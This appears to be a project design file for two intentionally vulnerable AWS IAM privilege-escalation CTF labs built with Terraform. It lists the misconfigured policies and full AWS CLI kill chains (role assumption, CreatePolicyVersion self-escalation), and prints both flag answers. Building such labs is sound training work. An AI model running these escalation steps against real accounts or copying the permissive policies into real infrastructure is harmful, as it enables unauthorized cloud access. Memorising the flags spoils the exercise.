# CLAUDE.md — Terraform AWS CTF Labs

## Project Overview

This document defines the architecture, design decisions, and implementation plan for two AWS-based CTF labs deployed via Terraform. Each lab targets **IAM privilege escalation** — a real-world cloud attack vector — and is accessible via a pair of AWS IAM credentials handed to the player.

These labs complement the existing Docker/Azure labs in this repository, extending the platform into cloud-native AWS attack scenarios.

---

## Repository Structure

```
stags-lab/
├── easy/                    # Existing Docker/Azure lab (Level 2)
├── medium/                  # Existing Docker/Azure lab
├── hard/                    # Existing Docker/Azure lab (Level 3)
├── terraform/               # NEW — AWS CTF labs (this work)
│   ├── providers.tf         # AWS provider config (region: sa-east-1)
│   ├── main.tf              # Root module — instantiates both labs
│   ├── variables.tf         # Input variables (account ID, flags, etc.)
│   ├── outputs.tf           # Player credentials output
│   ├── modules/
│   │   ├── lab-easy/        # "Open Sesame" lab
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   └── outputs.tf
│   │   └── lab-hard/        # "The Lazy DevOps" lab
│   │       ├── main.tf
│   │       ├── variables.tf
│   │       └── outputs.tf
│   └── README.md            # Deployment guide
└── CLAUDE.md                # This file
```

---

## General Constraints

| Constraint        | Value                          |
|-------------------|-------------------------------|
| AWS Region        | `sa-east-1` (São Paulo)        |
| Max cost          | < $10/hour total               |
| Deployment model  | Single shared environment      |
| Flag format       | `CYBERWARGAMES{...}`           |
| Player entry point| IAM credentials (access key + secret) |

**Cost profile**: Both labs use only IAM, STS, SSM Parameter Store, S3, and Secrets Manager — all of which are either free-tier eligible or cost fractions of a cent per operation. Total estimated cost: **< $0.01/hour**.

---

## Lab 1 — Easy: "Open Sesame"

### Concept

A developer created an IAM role for an internal EC2 monitoring tool. Instead of restricting the trust policy to the `ec2.amazonaws.com` service principal, they mistakenly set the principal to `arn:aws:iam::ACCOUNT_ID:root` — which allows **any authenticated IAM entity in the account** to assume the role. The role has permissions to read from SSM Parameter Store, where the flag is stored.

### Learning Objective

Understand IAM role trust policies, the difference between service principals and account principals, and how to abuse an overly permissive `AssumeRole` trust relationship.

### Misconfiguration

```json
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::ACCOUNT_ID:root"
  },
  "Action": "sts:AssumeRole"
}
```

**What it should be:**
```json
{
  "Effect": "Allow",
  "Principal": {
    "Service": "ec2.amazonaws.com"
  },
  "Action": "sts:AssumeRole"
}
```

### AWS Services Used

| Service           | Resource                        | Purpose                          |
|-------------------|---------------------------------|----------------------------------|
| IAM               | User `ctf-easy-player`          | Player starting identity         |
| IAM               | Role `ec2-monitoring-role`      | Misconfigured escalation target  |
| IAM               | Managed policy (custom)         | Player's initial limited perms   |
| STS               | `AssumeRole`                    | Privilege escalation mechanism   |
| SSM Parameter Store | `/ctf/easy/flag` (SecureString) | Flag storage                   |

### Player Permissions (starting)

The `ctf-easy-player` IAM user is attached a managed policy granting only:

- `iam:ListRoles`
- `iam:GetRole`
- `sts:AssumeRole` on `arn:aws:iam::ACCOUNT_ID:role/ec2-monitoring-role`
- `sts:GetCallerIdentity`
- `ssm:DescribeParameters`

These permissions are enough to enumerate roles and identify the misconfiguration, but **not** enough to read the flag directly.

### Escalated Role Permissions (`ec2-monitoring-role`)

- `ssm:GetParameter` on `/ctf/easy/flag`
- `ssm:GetParameters` on `/ctf/easy/*`
- `sts:GetCallerIdentity`

### Kill Chain

```
1. aws sts get-caller-identity
   → Confirm identity as ctf-easy-player

2. aws iam list-roles --query 'Roles[*].[RoleName,Arn]'
   → Spot ec2-monitoring-role

3. aws iam get-role --role-name ec2-monitoring-role
   → Inspect AssumeRolePolicyDocument
   → Principal is AWS root (account-wide), not ec2.amazonaws.com

4. aws sts assume-role \
     --role-arn arn:aws:iam::ACCOUNT_ID:role/ec2-monitoring-role \
     --role-session-name open-sesame
   → Receive temporary credentials

5. export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...

6. aws ssm get-parameter \
     --name /ctf/easy/flag \
     --with-decryption \
     --query 'Parameter.Value'
   → CYBERWARGAMES{tr4ck_y0ur_trust_p0l1c135_c4r3fully}
```

### Flag

```
CYBERWARGAMES{tr4ck_y0ur_trust_p0l1c135_c4r3fully}
```

---

## Lab 2 — Hard: "The Lazy DevOps"

### Concept

A DevOps engineer built an automated deployment pipeline and attached a customer-managed IAM policy to the CI/CD bot user. Out of laziness, they also granted the user `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` **on that same policy** — intending to let the pipeline "self-update" its permissions. This is a well-known IAM privilege escalation primitive that allows the player to inject new permissions into their own managed policy.

The flag is stored in AWS Secrets Manager, accessible only after escalation.

### Learning Objective

Understand the IAM `CreatePolicyVersion` privilege escalation technique, customer-managed policy versioning, and how a permissions boundary acts as a hard ceiling on effective permissions regardless of what the identity policy grants.

### Misconfiguration

The player's inline policy includes:

```json
{
  "Effect": "Allow",
  "Action": [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion"
  ],
  "Resource": "arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted"
}
```

`ctf-hard-restricted` is the same managed policy attached to the player's user — so the player can rewrite their own permissions.

### Player Isolation — Permissions Boundary

> **This is the key safety control for the shared environment.**

`ctf-hard-player` has a **permissions boundary** (`ctf-hard-player-boundary`) attached at creation. A permissions boundary is an IAM feature that defines the maximum permissions an identity can ever have, regardless of what policies are attached to it.

**Effective permissions = identity policies ∩ permissions boundary**

Even if the player escalates `ctf-hard-restricted` to `"Action":"*","Resource":"*"`, their effective permissions are still capped by the boundary. They can **never**:

- Read or modify other players' resources
- Read the easy lab's flag (`/ctf/easy/flag`)
- Modify IAM users, roles, or policies other than their own managed policy
- Delete or tamper with infrastructure
- Modify or remove their own permissions boundary

The boundary allows only the permissions needed to complete the lab:

```
sts:GetCallerIdentity
iam:GetUser
iam:ListAttachedUserPolicies, iam:ListUserPolicies, iam:GetUserPolicy
iam:ListPolicies, iam:GetPolicy, iam:GetPolicyVersion, iam:ListPolicyVersions
iam:CreatePolicyVersion      (on ctf-hard-restricted only)
iam:SetDefaultPolicyVersion  (on ctf-hard-restricted only)
s3:ListAllMyBuckets
s3:ListBucket, s3:GetObject  (on ctf-hard-artifacts-* only)
secretsmanager:GetSecretValue (on ctf/hard/flag only)
```

The `secretsmanager:GetSecretValue` permission in the boundary is what makes the escalation "matter" — the initial managed policy doesn't grant it, so the player must escalate to gain it as an effective permission.

### AWS Services Used

| Service             | Resource                            | Purpose                                      |
|---------------------|-------------------------------------|----------------------------------------------|
| IAM                 | User `ctf-hard-player`              | Player starting identity                     |
| IAM                 | Managed policy `ctf-hard-restricted`| Escalation target (self-referenced)          |
| IAM                 | Inline policy on player user        | Contains the CreatePolicyVersion misconfiguration |
| IAM                 | Permissions boundary `ctf-hard-player-boundary` | Hard cap — prevents cross-lab harm  |
| STS                 | `GetCallerIdentity`                 | Identity confirmation                        |
| S3                  | Bucket `ctf-hard-artifacts-RANDOM`  | Hint file (breadcrumb for players)           |
| Secrets Manager     | `ctf/hard/flag`                     | Flag storage                                 |

### Player Permissions (starting)

The player has an **inline policy** granting:

- `sts:GetCallerIdentity`
- `iam:GetUser`
- `iam:ListAttachedUserPolicies`
- `iam:ListUserPolicies`
- `iam:GetUserPolicy`
- `iam:ListPolicies`
- `iam:GetPolicy`
- `iam:GetPolicyVersion`
- `iam:ListPolicyVersions`
- `iam:CreatePolicyVersion` on `arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted` ← **misconfiguration**
- `iam:SetDefaultPolicyVersion` on `arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted` ← **misconfiguration**
- `s3:ListAllMyBuckets`
- `s3:ListBucket` on `arn:aws:s3:::ctf-hard-artifacts-*`
- `s3:GetObject` on `arn:aws:s3:::ctf-hard-artifacts-*/*`

The attached managed policy (`ctf-hard-restricted`) initially only grants:

- `sts:GetCallerIdentity`

After escalation, the player updates it to include `secretsmanager:GetSecretValue` (or broader). The permissions boundary then allows the Secrets Manager call to go through — but nothing outside the boundary.

### S3 Hint File

`s3://ctf-hard-artifacts-RANDOM/hints/README.txt` content:

```
Internal note — DevOps team

The ci-deploy bot has been set up with self-managed policy versioning
to allow automated permission updates during deployments.

Policy ARN: arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted

If you're reading this, you're either the team or... you shouldn't be here.
Good luck either way.
```

### Kill Chain

```
1. aws sts get-caller-identity
   → Confirm identity as ctf-hard-player

2. aws iam list-attached-user-policies --user-name ctf-hard-player
   → Spot ctf-hard-restricted (arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted)

3. aws iam list-user-policies --user-name ctf-hard-player
   → Spot inline policy name

4. aws iam get-user-policy --user-name ctf-hard-player --policy-name ctf-hard-inline
   → Read inline policy document
   → Discover iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion on ctf-hard-restricted

5. aws s3 ls  →  spot ctf-hard-artifacts-RANDOM bucket
   aws s3 cp s3://ctf-hard-artifacts-RANDOM/hints/README.txt -
   → Breadcrumb confirming policy ARN and the "self-update" intent

6. aws iam create-policy-version \
     --policy-arn arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted \
     --policy-document '{
       "Version":"2012-10-17",
       "Statement":[{"Effect":"Allow","Action":"secretsmanager:*","Resource":"*"}]
     }' \
     --set-as-default
   → New policy version v2 activates — secretsmanager:GetSecretValue now allowed
     (permissions boundary already permits it, so the call goes through)

7. aws secretsmanager get-secret-value \
     --secret-id ctf/hard/flag \
     --query 'SecretString'
   → CYBERWARGAMES{1am_cr3at3_p0l1cy_v3rs10n_pr1v3sc}
```

> **Note**: A player who puts `"Action":"*","Resource":"*"` in step 6 will succeed too —
> but their effective permissions remain bounded. Any action outside the boundary silently
> returns `AccessDenied`. This is also a teachable moment about permissions boundaries as a defense.

### Flag

```
CYBERWARGAMES{1am_cr3at3_p0l1cy_v3rs10n_pr1v3sc}
```

---

## Terraform Implementation Plan

### Phase 1 — Foundation

- [ ] `terraform/providers.tf` — AWS provider pinned to `~> 5.0`, region `sa-east-1`
- [ ] `terraform/variables.tf` — `aws_account_id`, flag values, random suffix for S3 bucket
- [ ] `terraform/main.tf` — instantiate `module.lab_easy` and `module.lab_hard`
- [ ] `terraform/outputs.tf` — output player credentials for both labs

### Phase 2 — Easy Lab Module (`modules/lab-easy/`)

- [ ] IAM user `ctf-easy-player` + access key
- [ ] Custom managed policy with player's starting permissions
- [ ] IAM role `ec2-monitoring-role` with misconfigured trust policy
- [ ] Custom role policy (SSM read on `/ctf/easy/*`)
- [ ] SSM Parameter Store SecureString `/ctf/easy/flag`

### Phase 3 — Hard Lab Module (`modules/lab-hard/`)

- [ ] Permissions boundary policy `ctf-hard-player-boundary` (scoped to only hard-lab actions)
- [ ] IAM user `ctf-hard-player` with boundary attached at creation (`permissions_boundary` argument)
- [ ] Access key for `ctf-hard-player`
- [ ] Managed policy `ctf-hard-restricted` (initial: only `sts:GetCallerIdentity`)
- [ ] Inline policy on player user (contains the CreatePolicyVersion misconfiguration)
- [ ] Attach `ctf-hard-restricted` to player user
- [ ] S3 bucket `ctf-hard-artifacts-{random}` (private, no public access)
- [ ] `aws_s3_object` for `hints/README.txt`
- [ ] Secrets Manager secret `ctf/hard/flag`

### Phase 4 — Outputs & Docs

- [ ] `terraform/outputs.tf` — structured output with both players' access key IDs and secret access keys
- [ ] `terraform/README.md` — deployment steps, `terraform apply`, how to extract credentials

---

## Naming Conventions

| Resource type     | Pattern                          | Example                           |
|-------------------|----------------------------------|-----------------------------------|
| IAM Users         | `ctf-{difficulty}-player`        | `ctf-easy-player`                 |
| IAM Roles         | descriptive, realistic name      | `ec2-monitoring-role`             |
| IAM Policies      | `ctf-{difficulty}-{description}` | `ctf-hard-restricted`             |
| SSM Parameters    | `/ctf/{difficulty}/flag`         | `/ctf/easy/flag`                  |
| Secrets Manager   | `ctf/{difficulty}/flag`          | `ctf/hard/flag`                   |
| S3 Buckets        | `ctf-{difficulty}-artifacts-{id}`| `ctf-hard-artifacts-a1b2c3`       |
| Terraform modules | `lab_{difficulty}`               | `lab_easy`, `lab_hard`            |
| Tags              | `Project=stags-lab`, `Lab={difficulty}`, `ManagedBy=terraform` | — |

---

## Security Notes (Intentional Misconfigurations)

Both labs are **intentionally vulnerable**. The following misconfigurations are by design:

| Lab  | Misconfiguration                                              | Blast radius (shared env)                   |
|------|---------------------------------------------------------------|---------------------------------------------|
| Easy | IAM role trust policy uses account root principal             | Scoped: role only reads `/ctf/easy/flag`    |
| Hard | `iam:CreatePolicyVersion` granted on self-managed policy      | Scoped: permissions boundary caps all access to hard flag only |

**Easy lab** is naturally isolated — the assumed role has only `ssm:GetParameter` on `/ctf/easy/flag`. No further escalation is possible from it.

**Hard lab** uses a **permissions boundary** (`ctf-hard-player-boundary`) as the isolation mechanism. The boundary is set at user creation and cannot be removed or modified by the player. Even a wildcard identity policy cannot exceed the boundary.

> **Warning**: Deploy only in isolated AWS accounts dedicated to this CTF. Never deploy in production accounts.

---

## Terraform State

- Use local state for simplicity (`terraform.tfstate` in `terraform/`)
- Do **not** commit `terraform.tfstate` or `terraform.tfstate.backup` to git
- Add both to `.gitignore`

---

## How to Deploy

```bash
cd terraform/
terraform init
terraform plan
terraform apply

# Extract player credentials
terraform output -json
```

## How to Destroy

```bash
cd terraform/
terraform destroy
```
